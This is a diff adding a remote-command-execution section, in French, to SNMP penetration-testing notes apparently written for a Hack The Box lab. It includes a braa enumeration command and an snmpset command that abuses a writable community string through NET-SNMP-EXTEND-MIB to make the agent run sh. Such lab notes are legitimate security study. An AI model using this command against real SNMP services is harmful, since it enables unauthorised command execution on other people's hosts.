@@ -1319,3 +1319,12 @@ dsgsec@htb[/htb]$ braa public@10.129.14.128:.1.3.6.*
 ```
 
 Encore une fois, nous tenons à souligner que la configuration indépendante du service SNMP nous apportera une grande variété d'expériences différentes qu'aucun tutoriel ne peut remplacer. Par conséquent, nous vous recommandons vivement de configurer une machine virtuelle avec SNMP, de l'expérimenter et d'essayer différentes configurations. SNMP peut être une aubaine pour un informaticien. administrateur système ainsi qu'une malédiction pour les analystes et les gestionnaires de sécurité.
+
+### RCE
+Il est possible d'executer des commandes à distances avec une communauté en droit d'écritures :
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp/snmp-rce
+
+snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c public 10.129.67.235 \
+'nsExtendStatus."evilcommand"' = createAndGo \
+'nsExtendCommand."evilcommand"' = sh \
+'nsExtendArgs."evilcommand"' = '/usr/share/flag.txt'
